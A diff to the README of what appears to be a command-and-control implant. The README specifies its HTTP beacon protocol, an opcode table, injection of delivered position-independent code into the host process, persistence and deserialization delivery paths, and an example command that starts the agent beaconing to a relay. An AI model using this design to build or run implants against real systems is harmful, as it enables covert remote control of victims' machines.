@@ -21,10 +21,12 @@ the mode:
 | Variable | Meaning |
 |---|---|
 | `H_URL` | The beacon endpoint — the HTTP relay root (`https://<relay>/`). Set ⇒ agent mode: the beacon loop parks the loading thread forever (see Host contract). |
-| `A_URL` | The direct download URL of the PIC agent bytes to inject — the `0x0C` UpgradeNative command carries only env lines, so the agent ALWAYS downloads the bytes from `A_URL` at runtime; when `H_URL` is absent it also drives the legacy one-shot path (the Persistence Manager's on-logon flow). |
 
 `W_URL` (the relay the injected WebSocket agent connects back to) is read by the INJECTED agent
-from the process environment — the `0x0C` payload's env lines set it.
+from the process environment — the `0x0C` payload's trailing env lines set it. The `0x0C` PIC
+bytes ride the command itself (`[binLen:u32le][bytes][env lines]`): there is NO runtime
+download and NO `A_URL` anywhere in this agent (2026-09-17 — the `C2Payload` download arm was
+removed; the C2 fetches the bytes browser-side and embeds them).
 
 `X-Client-Features` always ships `1000000000000000` — exactly ONE capability,
 **UpgradeNative** (category 4). `X-Client-Id` is `2` (this breed; the JScript agent is `1`).
@@ -45,7 +47,7 @@ The entry never exits the process on its own:
   response FIFO; the FIRST beacon POST carries `00000000` (u32 status 0 — chain completed), so
   the C2's delivery task observes success the moment the agent comes up. An unsolicited response
   body is dropped by the relay, so this is harmless for non-upgrade starts.
-- **The injected agent rides the same process.** `UpgradeNative` injects the delivered PIC (embedded in the command, or downloaded from `A_URL` on the legacy path) into
+- **The injected agent rides the same process.** `UpgradeNative` injects the delivered PIC (embedded in the command) into
   the current process; the agent therefore STAYS resident afterwards (exiting would kill the
   injected agent). `Exit` (`0x0A`) is the explicit operator terminate: it kills the host process
   and everything in it.
@@ -71,7 +73,7 @@ Identical to the jscript-agent's contract (spoken against the HTTP relay's root)
   form — `Tls12` doesn't exist on CLR 2.0) ADDS TLS 1.2 to the OS-default mask, never replaces
   it: Win10/11 keep negotiating 1.2 while stock Win7 falls back to its legacy TLS, which the
   relay edge accepts. A Tls12-ONLY mask bricks Win7 — the HTTPS connect dies before the first
-  POST. The A_URL download in `C2Payload` applies the same rule.
+  POST.
 - Every successful answer is `200 text/plain`: body = hex(next command) in the shared binary
   protocol (`[opcode][payload]`), empty body = nothing queued (re-POST immediately). Any non-200
   or transport failure is fatal — the loop unwinds, no retry.
@@ -83,7 +85,7 @@ Identical to the jscript-agent's contract (spoken against the HTTP relay's root)
 |---|---|---|
 | `0x0A` | Exit | Kills the host process (and any agent injected into it). No reply. |
 | `0x0B` | UpgradeNetFramework | Replies status `2` (the deserialization upgrade is the JScript agent's — this breed is already native). |
-| `0x0C` | UpgradeNative | Payload after the opcode: `NAME=value` env lines (same env-line style as the `0x0B` headers). `A_URL` names the PIC bytes to download (`C2Payload`) and `W_URL` the relay the injected WebSocket agent reads from the process env. Replies u32 as hex: `0` = injected, `1` = failed / nothing to inject. |
+| `0x0C` | UpgradeNative | Payload after the opcode: `[binLen:u32le][PIC binary][NAME=value env lines]` (same env-line style as the `0x0B` headers). The PIC bytes ride the command; `W_URL` (the relay the injected WebSocket agent reads from the process env) is the only current env line. Replies u32 as hex: `0` = injected, `1` = failed / nothing to inject. |
 | other | unknown | Replies u32 `2`. |
 
 ## Build
@@ -114,7 +116,7 @@ pushing a `v*` tag publishes a stable release (`release.yml`).
 Each side × arch also ships a **self-running `.exe` sibling**
 (`csharp-agent-<net2|net4>-<i386|x86_64|aarch64>.exe`): the same image compiled with
 `OutputType=exe`, so the runtime entry point and the deserialization static ctor share one
-guarded `Main` — run it directly with `H_URL`/`A_URL` in the environment (e.g.
+guarded `Main` — run it directly with `H_URL` in the environment (e.g.
 `set H_URL=https://<relay>/ && csharp-agent-net2-i386.exe`) to isolate the beacon/transport
 from the delivery chain. The panel never fetches these; its rows name the `.dll` assets.
 
